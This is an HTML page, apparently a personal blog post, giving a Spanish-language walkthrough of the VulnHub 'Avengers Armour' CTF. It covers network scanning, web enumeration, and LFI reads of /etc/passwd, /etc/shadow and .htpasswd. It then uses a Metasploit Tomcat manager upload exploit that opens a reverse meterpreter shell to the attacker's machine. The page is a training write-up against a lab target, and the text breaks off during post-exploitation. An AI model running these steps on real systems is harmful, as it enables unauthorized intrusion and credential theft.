@@ -1,1 +1,934 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CTF Avengers Armour - Write-up | Jose L. Trigo</title>
+  <meta name="description" content="Resolución completa del CTF Avengers Armour de VulnHub: enumeración, LFI, explotación de Tomcat, port forwarding y escalada de privilegios." />
 
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,600;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Fira Sans", sans-serif;
+      background: #020b14;
+      color: #cbd5dd;
+      -webkit-font-smoothing: antialiased;
+    }
+    a { color: #00a8ff; text-decoration: none; transition: color .2s; }
+    a:hover { color: #fff; text-decoration: none; }
+
+    .wrap {
+      max-width: 1280px;
+      margin: 28px auto;
+      padding: 24px;
+    }
+
+    /* --- HEADER FIJO (igual que el principal) --- */
+    .fixed-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #000D1F;
+      color: #e3edf7;
+      border-bottom: 1px solid #00a8ff;
+      z-index: 1000;
+      padding: .5rem 1.5rem;
+      box-shadow: 0 2px 20px rgba(0, 168, 255, .15);
+    }
+    .header-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1132px;
+      margin: 0 auto;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    .logo-img {
+      height: 38px;
+      width: auto;
+      display: block;
+    }
+    .nav-list {
+      list-style: none;
+      display: flex;
+      gap: 12px;
+      padding: 0;
+      margin: 0;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .nav-item {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 6px 14px;
+      border-radius: 4px;
+      background: #020b14;
+      color: #00a8ff;
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      font-size: .85rem;
+      letter-spacing: .5px;
+      border: 1px solid rgba(0, 168, 255, .4);
+      box-shadow: 0 0 8px rgba(0, 168, 255, .05);
+      transition: all .2s ease;
+    }
+    .nav-item:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 0 12px rgba(0, 168, 255, .3);
+      background: #051628;
+      color: #fff;
+      border-color: #00a8ff;
+    }
+    .nav-item.active {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+    }
+    body { padding-top: 70px; }
+
+    /* --- SECCIONES --- */
+    section {
+      margin-bottom: 32px;
+      background: #051628;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, .3);
+      scroll-margin-top: 90px;
+    }
+    h1 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 2rem;
+      margin: 0 0 0.5rem 0;
+      border-left: 4px solid #00a8ff;
+      padding-left: 16px;
+    }
+    h2 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 1.5rem;
+      margin: 1.5rem 0 0.75rem 0;
+      border-bottom: 1px solid rgba(0, 168, 255, .2);
+      padding-bottom: 0.5rem;
+    }
+    h3 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 600;
+      color: #00a8ff;
+      font-size: 1.2rem;
+      margin: 1.2rem 0 0.5rem 0;
+      scroll-margin-top: 90px;
+    }
+    h4 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 500;
+      color: #cbd5dd;
+      font-size: 1rem;
+      margin: 1rem 0 0.25rem 0;
+    }
+    p, li {
+      color: #cbd5dd;
+      line-height: 1.6;
+      font-size: 0.95rem;
+    }
+    .lead {
+      color: #4a75a0;
+      font-size: 1rem;
+      margin-bottom: 1.2rem;
+    }
+    .subhead {
+      color: #4a75a0;
+      font-size: 0.9rem;
+      margin-top: -0.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    /* --- BLOQUES DE TERMINAL --- */
+    .term-block {
+      background: #020b14;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      overflow-x: auto;
+      font-family: "JetBrains Mono", ui-monospace, monospace;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      color: #cbd5dd;
+    }
+    .term-block .prompt {
+      color: #00a8ff;
+      font-weight: 700;
+    }
+    .term-block .output {
+      color: #e3edf7;
+    }
+    .term-block .comment {
+      color: #4a75a0;
+      font-style: italic;
+    }
+    .term-block .highlight {
+      color: #ffbd2e;
+    }
+
+    /* --- IMÁGENES --- */
+    figure {
+      margin: 20px 0;
+      text-align: center;
+    }
+    figure img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, .4);
+    }
+    figcaption {
+      color: #4a75a0;
+      font-size: 0.8rem;
+      margin-top: 6px;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- TABLAS --- */
+    .table-wrap {
+      overflow-x: auto;
+      margin: 16px 0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      background: #020b14;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+    }
+    th, td {
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 168, 255, .1);
+    }
+    th {
+      color: #00a8ff;
+      font-weight: 700;
+      font-family: "JetBrains Mono", monospace;
+      background: #051628;
+    }
+    td {
+      color: #cbd5dd;
+    }
+    tr:last-child td {
+      border-bottom: none;
+    }
+    /* Para tablas sin cabecera, usamos solo td en negrita si queremos */
+    .table-plain td:first-child {
+      font-weight: 600;
+      color: #e3edf7;
+    }
+
+    /* --- LISTAS --- */
+    ul, ol {
+      padding-left: 1.5rem;
+      color: #cbd5dd;
+    }
+    li {
+      margin-bottom: 0.3rem;
+    }
+
+    /* --- BOTÓN DE VOLVER --- */
+    .btn-back {
+      display: inline-block;
+      background: transparent;
+      border: 1px solid rgba(0, 168, 255, .4);
+      color: #00a8ff;
+      padding: 6px 16px;
+      border-radius: 4px;
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.8rem;
+      font-weight: 700;
+      transition: all 0.3s;
+      text-decoration: none;
+    }
+    .btn-back:hover {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+      box-shadow: 0 0 15px rgba(0, 168, 255, .3);
+    }
+
+    /* --- FOOTER --- */
+    footer {
+      padding: 20px;
+      margin-top: 12px;
+      border-top: 1px solid rgba(0, 168, 255, .15);
+      color: #4a75a0;
+      text-align: center;
+      font-size: .85rem;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- INDICE --- */
+    .indice {
+      background: #020b14;
+      border: 1px solid rgba(0, 168, 255, .15);
+      border-radius: 6px;
+      padding: 16px 20px;
+      margin: 16px 0 24px 0;
+    }
+    .indice p {
+      margin: 0 0 8px 0;
+      font-weight: 600;
+      color: #4a75a0;
+      font-size: 0.9rem;
+      letter-spacing: 0.5px;
+    }
+    .indice ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px 20px;
+    }
+    .indice li {
+      margin: 0;
+    }
+    .indice a {
+      color: #00a8ff;
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.85rem;
+      font-weight: 500;
+      transition: color .2s, border-color .2s;
+      border-bottom: 1px solid transparent;
+      padding-bottom: 2px;
+    }
+    .indice a:hover {
+      color: #fff;
+      border-bottom-color: #00a8ff;
+    }
+
+    /* --- RESPONSIVE --- */
+    @media (max-width: 720px) {
+      .header-content { flex-direction: column; gap: 10px; }
+      body { padding-top: 110px; }
+      .nav-item { padding: 6px 10px; font-size: .75rem; }
+      h1 { font-size: 1.6rem; }
+      .indice ul { gap: 6px 12px; }
+      .indice a { font-size: 0.75rem; }
+    }
+    @media (max-width: 480px) {
+      .wrap { padding: 12px; }
+      section { padding: 16px; }
+      .term-block { font-size: 0.75rem; padding: 10px; }
+      .indice { padding: 12px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER FIJO (igual que el principal, enlazando a la raíz) -->
+  <header class="fixed-header">
+    <div class="header-content">
+      <span class="logo-container">
+        <a href="../../index.html">
+          <img src="../../imagenes/logo.png" alt="Logo JT" class="logo-img" />
+        </a>
+      </span>
+      <nav class="header-nav" aria-label="Navegación principal">
+        <ul class="nav-list">
+          <li><a class="nav-item" href="../../index.html#proyectos">Proyectos</a></li>
+          <li><a class="nav-item" href="../../herramientas/index.html">Herramientas</a></li>
+          <li><a class="nav-item" href="../../index.html#contacto">Contacto</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <div class="wrap">
+
+    <!-- ENCABEZADO DEL POST  -->
+    <div style="background:#051628; border:1px solid rgba(0,168,255,.2); border-radius:8px; padding:24px; margin-bottom:24px;">
+      <div style="display:flex; flex-wrap:wrap; gap:20px; align-items:center;">
+        <div style="flex:1; min-width:260px;">
+          <h1 style="border-left:none; padding-left:0; margin:0;">CTF: Avengers Armour (VulnHub)</h1>
+          <p style="color:#4a75a0; margin:4px 0 8px;">Write‑up completo · José Luis Trigo Calvo</p>
+          <div style="display:flex; flex-wrap:wrap; gap:12px; margin-top:8px;">
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#LFI</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#Tomcat</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#Metasploit</span>
+          </div>
+        </div>
+        <div style="flex:0 0 180px; display:flex; justify-content:center;">
+          <img src="../../imagenes/avengers_ctf.png" alt="Avengers Armour CTF" style="max-width:180px; border-radius:6px; border:1px solid rgba(0,168,255,.3);" />
+        </div>
+      </div>
+      <!-- Datos del autor en tabla -->
+      <div style="margin-top:20px; border-top:1px solid rgba(0,168,255,.1); padding-top:16px;">
+        <table style="width:auto; background:transparent; border:none; font-size:0.9rem;">
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Autor</td><td style="padding:4px 0; border:none; color:#e3edf7;">José Luis Trigo Calvo</td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">LinkedIn</td><td style="padding:4px 0; border:none;"><a href="https://linkedin.com/in/jltrigoc/" target="_blank">linkedin.com/in/jltrigoc/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Web</td><td style="padding:4px 0; border:none;"><a href="https://joseltc.github.io/" target="_blank">joseltc.github.io/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Email</td><td style="padding:4px 0; border:none;"><a href="mailto:jltrigoc01@gmail.com">jltrigoc01@gmail.com</a></td></tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- DECLARACIÓN DE USO ÉTICO -->
+    <section style="margin-bottom:24px;">
+      <h2>Declaración de uso ético</h2>
+      <p>El contenido de este documento refleja el proceso de resolución de un CTF (Capture The Flag) con fines estrictamente educativos. Todas las herramientas y comandos empleados se han utilizado en un entorno controlado y autorizado, como parte de mi formación como ethical hacker. No se ha realizado ninguna actividad ilícita ni se ha atacado ningún sistema real sin consentimiento. El único propósito de este trabajo es el aprendizaje y la mejora de las habilidades en ciberseguridad.</p>
+    </section>
+
+    <!-- MÁQUINAS UTILIZADAS -->
+    <section style="margin-bottom:24px;">
+      <h2>Máquinas utilizadas</h2>
+      <ul>
+        <li><strong>Kali Linux</strong> : <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
+        <li><strong>CTF Avengers Armour</strong> : <a href="https://www.vulnhub.com/entry/ha-armour,370/" target="_blank">https://www.vulnhub.com/entry/ha-armour,370/</a></li>
+      </ul>
+    </section>
+
+    <!-- RESOLUCIÓN PASO A PASO -->
+    <section>
+      <h2>RESOLUCIÓN PASO A PASO</h2>
+
+      <!-- ÍNDICE DE CONTENIDO -->
+      <div class="indice">
+        <p>📑 Índice</p>
+        <ul>
+          <li><a href="#reconocimiento">1. Reconocimiento</a></li>
+          <li><a href="#enumeracion">2. Enumeración Web</a></li>
+          <li><a href="#explotacion">3. Explotación de Tomcat</a></li>
+          <li><a href="#escalada">4. Escalada de privilegios</a></li>
+          <li><a href="#resultados">5. Resultados</a></li>
+        </ul>
+      </div>
+
+      <!-- 1. Reconocimiento -->
+      <h3 id="reconocimiento">1.- Reconocimiento de máquinas</h3>
+      <p>Ambas máquinas se encuentran dentro de una misma interfaz de red.</p>
+      <p>Con el comando ip a comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. ( IP Kali Linux -&gt; 192.168.56.129)</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> ip a
+      </div>
+      <p>Con el comando <strong>sudo nmap -sn 192.168.56.0/24</strong> buscamos la IP de nuestra máquina Avengers.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> sudo nmap -sn 192.168.56.0/24
+      </div>
+      <figure>
+        <img src="imagenes/avengers1.png" alt="Resultado del escaneo de red con nmap" />
+        <figcaption>Escaneo de red: IP de Avengers = 192.168.56.128</figcaption>
+      </figure>
+      <p>Como hemos visto en la página donde hemos obtenido la máquina, el objetivo del CTF es recuperar las 5 armaduras ocultas de los vengadores. Además, nos indica que hay una contraseña oculta dentro de la máquina dividida en 3 partes.</p>
+      <p>Procederemos a escanear la máquina Avengers más a fondo para saber los servicios que está prestando y en que puertos.</p>
+      <p>Utilizaremos el comando <strong>nmap -p- -sV 192.168.56.128</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap -p- -sV 192.168.56.128
+      </div>
+      <figure>
+        <img src="imagenes/avengers2.png" alt="Escaneo de puertos con nmap -p- -sV" />
+        <figcaption>Puertos abiertos: 80 (http), 8009 (Apache Jserv), 8080 (Apache Tomcat), 65534 (ssh)</figcaption>
+      </figure>
+      <p>Como podemos ver obtenemos que la máquina tiene abiertos los siguientes puertos y está ofreciendo los siguientes servicios:</p>
+      <div class="table-wrap">
+        <table class="table-plain">
+          <tbody>
+            <tr><td>Puerto 80</td><td>Apache / http</td></tr>
+            <tr><td>Puerto 8009</td><td>Apache Jserv</td></tr>
+            <tr><td>Puerto 8080</td><td>Apache Tomcat</td></tr>
+            <tr><td>Puerto 65534</td><td>SSH</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Revisaremos el puerto 80 en la web para ver si nos han dejado alguna pista que sea fácilmente identificable a simple vista.</p>
+      <figure>
+        <img src="imagenes/avengers3.png" alt="Página web del puerto 80" />
+        <figcaption>Página web del puerto 80</figcaption>
+      </figure>
+      <p>No encontramos nada en una primera vista, de modo que como también tenemos un puerto abierto con SSH vamos a intentar acceder.</p>
+      <p>Con el comando <strong>ssh 192.168.56.128 -p 65534</strong> intentamos acceder a SSH y como podemos ver en el archivo de configuración de SSH encontramos la primera armadura y la primera pista.</p>
+      <figure>
+        <img src="imagenes/avengers4.png" alt="Acceso SSH" />
+        <figcaption>Acceso SSH</figcaption>
+      </figure>
+
+      <div class="table-wrap">
+        <table>
+          <tbody>
+            <tr><td><strong>HULK ARMOUR</strong></td><td>7BDA7019C06B53AEFC8EE95D2CDACCAA</td></tr>
+            <tr><td><strong>HINT 1</strong></td><td>TheOlympics</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- 2. Enumeración Web -->
+      <h3 id="enumeracion">2.-Enumeración Web</h3>
+      <p>Como ya hemos encontrado la primera armadura y, cuando revisamos la web alojada en el puerto 80 no encontramos nada, vamos a realizar un escaneo de enumeración web para descubrir directorios y archivos ocultos en servidores web.</p>
+      <p>Utilizaremos el comando <strong>gobuster dir -u http://192.168.56.128 -w /usr/share/wordlists/dirb/common.txt</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> gobuster dir -u http://192.168.56.128 -w /usr/share/wordlists/dirb/common.txt
+      </div>
+      <figure>
+        <img src="imagenes/avengers5.png" alt="Resultado de gobuster" />
+        <figcaption>Directorio descubiertos con gobuster</figcaption>
+      </figure>
+      <p>Con este comando conseguimos la estructura de directorios del servidor web pero tampoco vemos nada que nos llame la atención.</p>
+      <p>Probaremos con el comando nikto -h 192.168.56.128 para ver si con otra herramienta encontramos algo distinto.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nikto -h 192.168.56.128
+      </div>
+      <figure>
+        <img src="imagenes/avengers6.png" alt="Resultado de nikto" />
+        <figcaption>Resultado de nikto</figcaption>
+      </figure>
+      <p>Seguimos obteniendo los mismos resultados. Vamos a comprobar el código index.html por si nos hubieran dejado alguna pista oculta en su interior.</p>
+      <figure>
+        <img src="imagenes/avengers7.png" alt="Código fuente de index.html" />
+        <figcaption>Código fuente de index.html</figcaption>
+      </figure>
+      <p>En el código podemos encontrar estas 3 pequeñas pistas que podrían ser un usuario, un puerto y un archivo a descargar.</p>
+      <p>Vamos a comprobar si hay algún servicio en el puerto 69.</p>
+      <p>Como con el comando nmap -sV obteníamos los puertos TCP y el 69 no salía, vamos a probar con nmap -sU -p69 192.168.56.128 con el que obtenemos los puertos UDP que la máquina tenga abiertos o con servicios activos.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap -sU -p69 192.168.56.128
+      </div>
+      <figure>
+        <img src="imagenes/avengers8.png" alt="Escaneo UDP puerto 69" />
+        <figcaption>Escaneo UDP puerto 69</figcaption>
+      </figure>
+      <p>Como vemos hay un servicio tftp en el puerto 69. Lo más probable es que el archivo notes.txt se encuentre en este servidor. Vamos a probar suerte.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> tftp 192.168.56.128
+      </div>
+      <div class="term-block">
+        <span class="prompt">tftp&gt;</span> get notes.txt
+      </div>
+      <figure>
+        <img src="imagenes/avengers9.png" alt="Descarga de notes.txt" />
+        <figcaption>Descarga de notes.txt</figcaption>
+      </figure>
+      <p>Hemos obtenido el archivo del servidor tftp con el comando <strong>get notes.txt</strong> y en el archivo podemos ver que está la segunda armadura, esta vez es la de Spiderman, y la segunda parte de la contraseña.</p>
+      <figure>
+        <img src="imagenes/avengers10.png" alt="Contenido de notes.txt" />
+        <figcaption>Contenido de notes.txt</figcaption>
+      </figure>
+
+      <div class="table-wrap">
+        <table>
+          <tbody>
+            <tr><td><strong>Spiderman Armour</strong></td><td>83A75F0B31435193BAFD3B9C5FD45AEC</td></tr>
+            <tr><td><strong>Hint 2</strong></td><td>maybeevena</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>Como en ninguna de las pistas hemos encontrado algún camino que seguir, vamos a utilizar la herramienta <strong>dirbuster</strong> con el objetivo de intentar profundizar más dentro del servidor apache.</p>
+      <figure>
+        <img src="imagenes/avengers11.png" alt="Configuración de dirbuster" />
+        <figcaption>Configuración de dirbuster</figcaption>
+      </figure>
+      <p>Después de un buen rato de búsqueda, hemos encontrado un archivo php que puede ser interesante para la explotación de LFI.</p>
+      <figure>
+        <img src="imagenes/avengers12.png" alt="Resultado de dirbuster" />
+        <figcaption>Resultado de dirbuster</figcaption>
+      </figure>
+      <p>LFI (Local File Inclusion) es una vulnerabilidad de seguridad web que permite a un atacante incluir y ejecutar archivos locales del servidor a través de una aplicación web. Ocurre cuando una aplicación permite que el usuario especifique la ruta de un archivo sin validar adecuadamente la entrada, lo que permite al atacante manipular el parámetro para acceder a archivos sensibles del sistema.</p>
+      <p>Al abrir el archivo en el navegador podemos ver que está vacío.</p>
+      <p>Con la búsqueda <strong>http://192.168.56.128/file.php?file=/etc/passwd</strong> vamos a comprobar si realmente la máquina es vulnerable a este ataque. (Si nos muestra el archivo podemos determinar que sí es vulnerable).</p>
+      <figure>
+        <img src="imagenes/avengers13.png" alt="Comprobación de LFI" />
+        <figcaption>Comprobación de LFI</figcaption>
+      </figure>
+      <p>Ahora que ya sabemos que es vulnerable, vamos a comprobar los principales archivos del sistema y de los servicios que se encuentran instalados en la máquina vulnerable.</p>
+
+      <p><strong>Archivos por comprobar:</strong></p>
+      <p><em>(Las rutas incluidas en el documento suelen ser las que se usan de manera genérica en el proceso de instalación de los servicios, pero puede ser que no se correspondan con las de la máquina vulnerable, y por tanto, no encontremos los archivos deseados, pero es muy interesante hacer la búsqueda de estos archivos porque pueden contener lo que buscamos.)</em></p>
+
+      <p><strong>Sistema:</strong></p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Archivo</th><th>Ubicación</th><th>Propósito</th></tr></thead>
+          <tbody>
+            <tr><td>/etc/passwd</td><td>/etc/passwd</td><td>Usuarios del sistema (confirmar LFI)</td></tr>
+            <tr><td>/etc/shadow</td><td>/etc/shadow</td><td>Hashes de contraseñas de usuarios</td></tr>
+            <tr><td>/etc/hosts</td><td>/etc/hosts</td><td>Resolución de nombres local</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>En estos archivos encontramos lo siguiente:</p>
+      <p>En /etc/passwd encontramos dos usuarios de la máquina vulnerable:</p>
+      <figure>
+        <img src="imagenes/avengers14.png" alt="Contenido de /etc/passwd" />
+        <figcaption>Contenido de /etc/passwd</figcaption>
+      </figure>
+      <ul>
+        <li><strong>armour</strong></li>
+        <li><strong>aarti</strong></li>
+      </ul>
+      <p>En los otros dos ficheros no encontramos nada relevante (el fichero /etc/shadow no se nos muestra)</p>
+
+      <p><strong>Apache (Puerto 80):</strong></p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Archivo</th><th>Ubicación</th><th>Propósito</th></tr></thead>
+          <tbody>
+            <tr><td>.htpasswd</td><td>/etc/apache2/.htpasswd</td><td>Almacena credenciales de autenticación básica HTTP (posible 3ª parte de la contraseña)</td></tr>
+            <tr><td>apache2.conf</td><td>/etc/apache2/apache2.conf</td><td>Configuración principal del servidor Apache</td></tr>
+            <tr><td>sites-available/</td><td>/etc/apache2/sites-available/</td><td>Configuración de sitios virtuales (dominios)</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>En el archivo /etc/apache2/.htpasswd encontramos la tercera armadura que buscábamos y la tercera y última parte de la contraseña.</p>
+      <figure>
+        <img src="imagenes/avengers15.png" alt="Contenido de .htpasswd" />
+        <figcaption>Contenido de .htpasswd</figcaption>
+      </figure>
+
+      <div class="table-wrap">
+        <table>
+          <tbody>
+            <tr><td><strong>Antman Armour</strong></td><td>A9F56B7ECE2113C9C4A1214A19EDE99C</td></tr>
+            <tr><td><strong>Hint 3</strong></td><td>StarBucks</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>El archivo /etc/apache2/apache2.conf no contiene nada relevante y el archivo /etc/apache2/apache2.conf no se muestra.</p>
+
+      <p><strong>Tomcat (Puerto 8080):</strong></p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Archivo</th><th>Ubicación</th><th>Propósito</th></tr></thead>
+          <tbody>
+            <tr><td>tomcat-users.xml</td><td>/etc/tomcat9/tomcat-users.xml o /usr/share/tomcat9/conf/tomcat-users.xml</td><td>Credenciales de usuarios de Tomcat (acceso al panel de administración)</td></tr>
+            <tr><td>server.xml</td><td>/etc/tomcat9/server.xml</td><td>Configuración principal de Tomcat</td></tr>
+            <tr><td>manager.xml</td><td>/etc/tomcat9/Catalina/localhost/manager.xml</td><td>Configuración del administrador de Tomcat</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>No he encontrado ninguno de los archivos en la máquina vulnerable.</p>
+
+      <p><strong>Apache JServ (Puerto 8009):</strong></p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Archivo</th><th>Ubicación</th><th>Propósito</th></tr></thead>
+          <tbody>
+            <tr><td>workers.properties</td><td>/etc/apache2/workers.properties</td><td>Configuración de trabajadores para conexión AJP</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>No he encontrado el archivo en la máquina vulnerable.</p>
+
+      <p><strong>SSH (Puerto 65534):</strong></p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Archivo</th><th>Ubicación</th><th>Propósito</th></tr></thead>
+          <tbody>
+            <tr><td>sshd_config</td><td>/etc/ssh/sshd_config</td><td>Configuración del servidor SSH</td></tr>
+            <tr><td>.bash_history</td><td>~/.bash_history</td><td>Historial de comandos del usuario (pistas, contraseñas)</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>En el archivo /etc/ssh/sshd_config encontramos alguna cosa interesante, que aunque ya la hemos conseguido por otros medios con anterioridad, también podríamos haber llegado a ella desde aquí.</p>
+      <p>El fichero de configuración indica que el banner no será el que tiene SSH por defecto, si no que será Banner /etc/ssh/sshd_banner.</p>
+      <figure>
+        <img src="imagenes/avengers16.png" alt="Contenido de sshd_config" />
+        <figcaption>Contenido de sshd_config</figcaption>
+      </figure>
+      <p>Si accedemos al documento a través de la web, vemos que nos volvemos a encontrar con la armadura de HULK y la HINT 1 que nos encontrábamos al iniciar el servicio SSH. Este fichero es su origen.</p>
+      <figure>
+        <img src="imagenes/avengers17.png" alt="Contenido de sshd_banner" />
+        <figcaption>Contenido de sshd_banner</figcaption>
+      </figure>
+
+      <hr />
+
+      <p>Si recapitulamos un poco ya hemos recuperado 3 de las 5 armaduras y ahora ya tenemos una contraseña completa al juntar las tres pistas.</p>
+      <p><strong>Contraseña -&gt; TheOlympicsmaybeevenaStarBucks</strong></p>
+      <p>Además, también hemos obtenido un par de usuarios del sistema como son:</p>
+      <ul>
+        <li><strong>armour</strong></li>
+        <li><strong>aarti</strong></li>
+      </ul>
+      <p>Vamos a ver como podemos utilizar estos datos con el fin de recuperar el resto de las armaduras.</p>
+
+      <hr />
+
+      <!-- 3. Explotación de Tomcat -->
+      <h3 id="explotacion">3.-Explotación de Tomcat</h3>
+      <p>El siguiente paso que debemos seguir es intentar buscar alguna vulnerabilidad en el servicio tomcat, ya que los usuarios y la contraseña obtenida deben servir para algo.</p>
+      <p>Para buscar vulnerabilidades de una aplicación, lo más sencillo es usar metasploit.</p>
+      <p>Con los comandos <strong>msfdb init &amp; msfconsole</strong> iniciamos la base de datos de metasploit y la consola.</p>
+      <figure>
+        <img src="imagenes/avengers18.png" alt="Inicio de Metasploit" />
+        <figcaption>Inicio de Metasploit</figcaption>
+      </figure>
+      <p>Con <strong>search tomcat</strong> encontramos más de 70 vulnerabilidades distintas en la máquina. Para realizar una búsqueda más eficiente y mas certera, vamos a utilizar el comando <strong>search type:exploit tomcat authenticated</strong> y de esta manera solo obtendremos las vulnerabilidades relacionadas con el inicio de sesión en tomcat.</p>
+      <div class="term-block">
+        <span class="prompt">msf6 &gt;</span> search type:exploit tomcat authenticated
+      </div>
+      <figure>
+        <img src="imagenes/avengers19.png" alt="Búsqueda de exploits de Tomcat" />
+        <figcaption>Búsqueda de exploits de Tomcat</figcaption>
+      </figure>
+      <p>Investigando un poco, la vulnerabilidad tomcat_mgr_upload es la recomendada para explotar porque es más moderna que la vulnerabilidad tomcat_mgr_deploy.</p>
+      <p>Con <strong>use exploit/multi/http/tomcat_mgr_upload</strong> iniciamos el uso del exploit y nos indica que el payload para realizar la Shell inversa no está configurado.</p>
+      <p>Con <strong>show options</strong> vemos las opciones que tiene esta vulnerabilidad y que serán las que debemos configurar con los datos que tenemos.</p>
+      <figure>
+        <img src="imagenes/avengers20.png" alt="Opciones del exploit" />
+        <figcaption>Opciones del exploit</figcaption>
+      </figure>
+      <p>Configuramos el exploit con los siguientes datos:</p>
+      <ul>
+        <li>set HttpPassword TheOlympicsmaybeevenaStarBucks</li>
+        <li>set HttpUsername armour</li>
+        <li>set RHOST 192.168.56.128 (esta es la IP de la máquina vulnerable)</li>
+        <li>set RPORT 8080 (puerto dónde está instalado tomcat)</li>
+        <li>set LHOST 192.168.56.129 (IP de la máquina Kali)</li>
+      </ul>
+      <figure>
+        <img src="imagenes/avengers21.png" alt="Configuración del exploit" />
+        <figcaption>Configuración del exploit</figcaption>
+      </figure>
+      <p>Ahora ya podemos ejecutar el exploit con <strong>run</strong> o <strong>exploit</strong>, pero al hacer esta ejecución nos indica que debemos ajustar esta configuración para que se inicie correctamente -&gt; <strong>set FingerprintCheck false</strong></p>
+      <p>Ahora al ejecutar run, ya nos indica que la sesión meterpreter ha sido abierta correctamente.</p>
+      <figure>
+        <img src="imagenes/avengers22.png" alt="Sesión meterpreter abierta" />
+        <figcaption>Sesión meterpreter abierta</figcaption>
+      </figure>
+      <p>Crearemos una shell y la haremos interactiva con <strong>python3 -c 'import pty; pty.spawn("/bin/bash")'</strong>. Ahora ya utilizaremos comandos propios de linux para intentar buscar alguna pista.</p>
+      <figure>
+        <img src="imagenes/avengers23.png" alt="Shell interactiva" />
+        <figcaption>Shell interactiva</figcaption>
+      </figure>
+      <p>Vamos a explorar los directorios /home de los usuarios del sistema. Como podemos ver en la imagen no encontramos nada destacable.</p>
+      <figure>
+        <img src="imagenes/avengers24.png" alt="Explorando /home" />
+        <figcaption>Explorando /home</figcaption>
+      </figure>
+      <p>Revisando alguna carpeta más como tftpboot vemos el origen de la armadura de Spiderman y la pista número 2, pero esto ya lo habíamos conseguido.</p>
+      <figure>
